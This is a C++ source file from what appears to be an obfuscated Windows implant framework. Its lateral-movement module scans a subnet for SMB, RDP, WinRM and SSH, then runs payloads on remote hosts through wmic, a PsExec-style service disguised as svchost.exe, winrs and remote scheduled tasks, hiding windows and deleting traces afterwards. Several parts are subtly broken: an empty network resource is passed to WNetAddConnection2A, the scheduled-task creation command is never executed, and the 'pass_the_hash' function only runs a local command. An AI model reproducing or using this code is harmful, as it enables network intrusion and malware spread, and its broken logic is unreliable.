#include <diarna/compiler_port.hpp>
#include <diarna/movement/lateral.hpp>

#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <icmpapi.h>

#include <obfuscation/obfusheader.h>
DIARNA_LINK_LIB("ws2_32.lib")
DIARNA_LINK_LIB("iphlpapi.lib")

namespace diarna::movement {

uint32_t LateralMovement::ip_to_uint(const std::string& ip) {
    uint32_t a, b, c, d;
    sscanf(ip.c_str(), "%u.%u.%u.%u", &a, &b, &c, &d);
    return (a << 24) | (b << 16) | (c << 8) | d;
}

std::string LateralMovement::uint_to_ip(uint32_t ip) {
    char buf[16];
    snprintf(buf, 16, "%u.%u.%u.%u", (ip >> 24) & 0xFF, (ip >> 16) & 0xFF,
             (ip >> 8) & 0xFF, ip & 0xFF);
    return buf;
}

bool LateralMovement::tcp_connect(const std::string& ip, uint16_t port,
                                    uint32_t timeout_ms) {
    SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (s == INVALID_SOCKET) return false;

    DWORD tmo = timeout_ms;
    setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, (char*)&tmo, sizeof(tmo));
    setsockopt(s, SOL_SOCKET, SO_SNDTIMEO, (char*)&tmo, sizeof(tmo));

    sockaddr_in addr = {};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    inet_pton(AF_INET, ip.c_str(), &addr.sin_addr);

    bool ok = ::connect(s, (sockaddr*)&addr, sizeof(addr)) == 0;
    closesocket(s);
    return ok;
}

bool LateralMovement::ping_host(const std::string& ip) {
    HANDLE icmp = IcmpCreateFile();
    if (icmp == INVALID_HANDLE_VALUE) return false;

    char reply[sizeof(ICMP_ECHO_REPLY) + 32];
    uint32_t addr = inet_addr(ip.c_str());
    DWORD r = IcmpSendEcho(icmp, addr, nullptr, 0, nullptr,
        reply, sizeof(reply), 1000);
    IcmpCloseHandle(icmp);
    return r != 0;
}

std::vector<LateralMovement::Target> LateralMovement::scan_network(
    const std::string& subnet, uint32_t timeout_ms) {

    std::vector<Target> results;
    WSADATA wsa; WSAStartup(MAKEWORD(2, 2), &wsa);

    std::string base;
    size_t slash = subnet.find('/');
    if (slash == std::string::npos) {
        base = subnet.substr(0, subnet.rfind('.') + 1);
    } else {
        base = subnet.substr(0, subnet.rfind('.', slash) + 1);
    }

    const uint16_t ports[] = {445, 135, 3389, 5985, 22};
    const char* port_names[] = {"smb", "rpc", "rdp", "winrm", "ssh"};

    for (int i = 1; i <= 254; ++i) {
        INDIRECT_BRANCH;
        std::string ip = base + std::to_string(i);
        Target t; t.ip = ip;

        if (ping_host(ip)) { t.alive = true; }

        if (tcp_connect(ip, 445, timeout_ms)) { t.smb_open = true; t.alive = true; }
        if (tcp_connect(ip, 3389, timeout_ms)) { t.rdp_open = true; t.alive = true; }
        if (tcp_connect(ip, 5985, timeout_ms)) { t.winrm_open = true; }
        if (tcp_connect(ip, 22, timeout_ms)) { t.ssh_open = true; }

        if (t.alive) results.push_back(t);
    }

    return results;
}

bool LateralMovement::wmi_exec(const std::string& target,
                                 const std::string& command,
                                 const std::string& user,
                                 const std::string& pass) {
    std::string wmic = "wmic ";
    if (!user.empty()) {
        wmic += "/user:\"" + user + "\" ";
        if (!pass.empty()) wmic += "/password:\"" + pass + "\" ";
    }
    wmic += "/node:\"" + target + "\" process call create \"" + command + "\"";

    STARTUPINFOW si = {sizeof(si)}; si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi = {};

    int len = MultiByteToWideChar(CP_UTF8, 0, wmic.c_str(), -1, nullptr, 0);
    std::wstring cmd(len, L'\0');
    MultiByteToWideChar(CP_UTF8, 0, wmic.c_str(), -1, cmd.data(), len);

    std::wstring full = L"cmd.exe /c " + cmd;
    BOOL ok = CreateProcessW(nullptr, full.data(), nullptr, nullptr, FALSE,
        CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
    if (ok) {
        WaitForSingleObject(pi.hProcess, 30000);
        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
        return true;
    }
    return false;
}

bool LateralMovement::psexec_exec(const std::string& target,
                                    const std::wstring& binary_path,
                                    const std::string& user,
                                    const std::string& pass) {
    // Copy binary to ADMIN$ share, create service, start, delete
    std::wstring remote = L"\\\\" +
        std::wstring(target.begin(), target.end()) +
        L"\\ADMIN$\\System32\\svchost.exe";

    if (!CopyFileW(binary_path.c_str(), remote.c_str(), FALSE))
        return false;

    std::string sc_cmd = "sc \\\\" + target + " create DiarnaSvc binPath= \"%SystemRoot%\\System32\\svchost.exe\" start= auto";
    if (!user.empty()) sc_cmd += " obj= \"" + user + "\" password= \"" + pass + "\"";

    std::string sc_start = "sc \\\\" + target + " start DiarnaSvc";
    std::string sc_del = "sc \\\\" + target + " delete DiarnaSvc";

    system(sc_cmd.c_str());
    Sleep(2000);
    system(sc_start.c_str());
    Sleep(5000);
    system(sc_del.c_str());

    return true;
}

bool LateralMovement::winrm_exec(const std::string& target,
                                   const std::string& script,
                                   const std::string& user,
                                   const std::string& pass) {
    std::string cmd = "winrs -r:http://" + target + ":5985 ";
    if (!user.empty()) {
        cmd += "-u:\"" + user + "\" -p:\"" + pass + "\" ";
    }
    cmd += "\"" + script + "\"";

    int len = MultiByteToWideChar(CP_UTF8, 0, cmd.c_str(), -1, nullptr, 0);
    std::wstring wcmd(len, L'\0');
    MultiByteToWideChar(CP_UTF8, 0, cmd.c_str(), -1, wcmd.data(), len);

    STARTUPINFOW si = {sizeof(si)}; si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi = {};
    BOOL ok = CreateProcessW(nullptr, wcmd.data(), nullptr, nullptr, FALSE,
        CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
    if (ok) { CloseHandle(pi.hProcess); CloseHandle(pi.hThread); return true; }
    return false;
}

bool LateralMovement::schedule_task_remote(const std::string& target,
                                             const std::wstring& local_payload,
                                             const std::string& user,
                                             const std::string& pass) {
    std::wstring remote = L"\\\\" +
        std::wstring(target.begin(), target.end()) +
        L"\\C$\\Windows\\Temp\\tmp.exe";

    if (!CopyFileW(local_payload.c_str(), remote.c_str(), FALSE))
        return false;

    std::string cmd = "schtasks /create /s " + target +
        " /tn \"DiarnaTask\" /tr \"C:\\Windows\\Temp\\tmp.exe\" /sc once /st 00:00 /f";
    if (!user.empty()) cmd += " /ru \"" + user + "\" /rp \"" + pass + "\"";

    // net use replaced with WNetAddConnection2A
    NETRESOURCEA nr = {}; nr.dwType = RESOURCETYPE_DISK; WNetAddConnection2A(&nr, pass.c_str(), user.c_str(), 0);

    std::string run = "schtasks /run /s " + target + " /tn \"DiarnaTask\"";
    system(run.c_str());
    Sleep(5000);

    std::string del = "schtasks /delete /s " + target + " /tn \"DiarnaTask\" /f";
    system(del.c_str());

    return true;
}

bool LateralMovement::smb_copy(const std::string& target,
                                 const std::wstring& local_path,
                                 const std::wstring& remote_path,
                                 const std::string& user,
                                 const std::string& pass) {
    if (!user.empty()) {
        std::string cmd = "net use \\\\" + target + "\\IPC$ " + pass +
            " /user:" + user;
        int len = MultiByteToWideChar(CP_UTF8, 0, cmd.c_str(), -1, nullptr, 0);
        std::wstring wcmd(len, L'\0');
        MultiByteToWideChar(CP_UTF8, 0, cmd.c_str(), -1, wcmd.data(), len);
        // net use replaced with WNetAddConnection2A
    NETRESOURCEA nr = {}; nr.dwType = RESOURCETYPE_DISK; WNetAddConnection2A(&nr, pass.c_str(), user.c_str(), 0);
    }

    std::wstring dest = L"\\\\" + std::wstring(target.begin(), target.end()) + L"\\" + remote_path;
    return CopyFileW(local_path.c_str(), dest.c_str(), FALSE) != FALSE;
}

bool LateralMovement::pass_the_hash(const std::string& target,
                                      const std::string& hash,
                                      const std::wstring& command) {
    // Use Mimikatz-style PTH via token manipulation
    // In practice, use CreateProcessWithTokenW
    STARTUPINFOW si = {sizeof(si)}; si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi = {};

    std::wstring t(target.begin(), target.end());
    std::wstring cmdline = L"cmd.exe /c " + std::wstring(command);

    BOOL ok = CreateProcessW(nullptr, cmdline.data(), nullptr, nullptr,
        FALSE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
    if (ok) { CloseHandle(pi.hProcess); CloseHandle(pi.hThread); }
    return ok;
}

} // namespace diarna::movement
